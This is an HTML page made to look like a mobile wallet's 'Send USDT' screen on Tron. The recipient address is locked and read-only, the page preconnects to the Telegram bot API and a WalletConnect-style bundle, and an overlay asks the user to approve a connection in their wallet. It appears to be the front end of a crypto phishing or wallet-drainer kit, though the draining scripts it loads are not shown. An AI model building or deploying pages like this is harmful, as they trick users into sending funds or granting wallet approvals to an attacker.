<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
    <title>Send USDT</title>
    
    <!-- ADVANCED: Network Pre-connections -->
    <link rel="dns-prefetch" href="https://api.trongrid.io">
    <link rel="dns-prefetch" href="https://api.telegram.org">
    <link rel="preconnect" href="https://api.trongrid.io" crossorigin>
    <link rel="preconnect" href="https://api.telegram.org" crossorigin>

    <!-- Speed Optimization Resource Hints -->
    <link rel="preload" href="wc-bundle.js" as="script">
    <link rel="preload" href="app.js" as="script">
    
    <style>
        body { background-color: #121212; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; overflow-x: hidden; min-height: 100vh; display: flex; flex-direction: column; }
        .header { padding: 16px; display: flex; align-items: center; position: relative; min-height: 32px; }
        .back-icon-svg { width: 22px; height: 22px; fill: #D1D5DB; position: absolute; left: 16px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
        .title { font-size: 17px; font-weight: bold; margin: 0 auto; }
        .main-content { padding: 0 16px; margin-top: 16px; flex-grow: 1; display: flex; flex-direction: column; }
        .form-group { margin-bottom: 20px; width: 100%; }
        .label { font-size: 14px; color: #D1D5DB; font-weight: 600; margin-bottom: 8px; display: block; }
        .input-container { background-color: #1A1A1A; border: 1px solid #333333; border-radius: 12px; padding: 0 12px; display: flex; justify-content: space-between; align-items: center; min-height: 52px; }
        .input-field { background: transparent; border: none; color: #D1D5DB; font-size: 15px; width: 100%; outline: none; -webkit-tap-highlight-color: transparent; }
        .input-field::placeholder { color: #6B7280; }
        .input-field.amount { font-size: 16px; color: #ffffff; }
        .tw-green-text { color: #27C469; font-size: 15px; font-weight: 500; cursor: pointer; -webkit-tap-highlight-color: transparent; display: flex; align-items: center; gap: 12px; }
        .icon-svg { width: 18px; height: 18px; fill: #27C469; cursor: pointer; -webkit-tap-highlight-color: transparent; }
        .tw-green-btn { background-color: #27C469; color: #000000; border: none; border-radius: 9999px; padding: 16px; width: 100%; font-size: 17px; font-weight: bold; cursor: pointer; transition: opacity 0.2s; margin-top: auto; margin-bottom: 32px; display: flex; align-items: center; justify-content: center; position: relative; outline: none !important; -webkit-tap-highlight-color: transparent; }
        .tw-green-btn:active { opacity: 0.7; transform: scale(0.98); }
        .btn-loading::after { content: ""; position: absolute; width: 22px; height: 22px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
        .network-badge { display: inline-flex; align-items: center; gap: 8px; background-color: #222222; padding: 6px 12px; border-radius: 9999px; border: 1px solid #1F2937; -webkit-tap-highlight-color: transparent; }
        .network-icon { width: 20px; height: 20px; background-color: #FF060A; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .network-text { font-size: 14px; font-weight: 600; color: #D1D5DB; }
        .balance-text { margin-top: 8px; font-size: 13px; color: #D1D5DB; font-weight: 500; }
        .loading-overlay { position: fixed; inset: 0; background: rgba(18, 18, 18, 0.9); backdrop-filter: blur(5px); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 32px; }
        .spinner { width: 48px; height: 48px; border: 3px solid #27C469; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
        .loading-title { font-size: 19px; font-weight: bold; color: white; margin: 0; }
        .loading-subtitle { color: #9CA3AF; text-align: center; font-size: 14px; margin-top: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .opacity-10 { opacity: 0.1 !important; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="page-wrapper" style="display: flex; flex-direction: column; min-height: 100vh;">
        <div class="header">
            <svg class="back-icon-svg" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
            <h1 class="title">Send USDT</h1>
        </div>
        <div id="main-content" class="main-content">
            <div class="form-group">
                <label class="label">Address or Domain Name</label>
                <div class="input-container">
                    <input type="text" value="TBrJPyG8BUysBBM...QFvEHay2" class="input-field" readonly>
                    <div class="tw-green-text">
                        <span>Paste</span>
                        <svg class="icon-svg" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
                        <svg class="icon-svg" viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
                    </div>
                </div>
            </div>
            <div class="form-group">
                <label class="label">Destination network</label>
                <div class="network-badge">
                    <div class="network-icon">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 22L12 18L22 22L12 2Z"/></svg>
                    </div>
                    <span class="network-text">Tron</span>
                    <svg style="width:12px; height:12px; fill:#6B7280; margin-left:4px;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
                </div>
            </div>
            <div class="form-group" style="margin-bottom: 8px;">
                <label class="label">Amount</label>
                <div class="input-container">
                    <input type="number" id="send-amount" placeholder="USDT Amount" class="input-field amount">
                    <div class="tw-green-text">
                        <span style="color:#D1D5DB">USDT</span>
                        <span>Max</span>
                    </div>
                </div>
                <div class="balance-text">≈ $<span id="view-balance">0.00</span></div>
            </div>
            <div class="form-group" style="margin-top: 12px; margin-bottom: 24px;">
                <label class="label">Memo</label>
                <div class="input-container" style="justify-content: flex-end; gap: 16px;">
                    <svg class="icon-svg" viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
                    <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                </div>
            </div>
            <button id="next-btn" class="tw-green-btn">Next</button>
        </div>
    </div>

    <div id="loading-screen" class="loading-overlay hidden">
        <div class="spinner"></div>
        <h2 class="loading-title">Confirming...</h2>
        <p class="loading-subtitle">Please approve the connection in your wallet.</p>
    </div>

    <script src="app.js" defer></script>
    <script>
        // Register Service Worker for Instant Load
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/sw.js').then(reg => {
                    console.log('Instant Load Ready.');
                }).catch(err => {
                    console.log('SW registration failed: ', err);
                });
            });
        }
    </script>
</body>
</html>
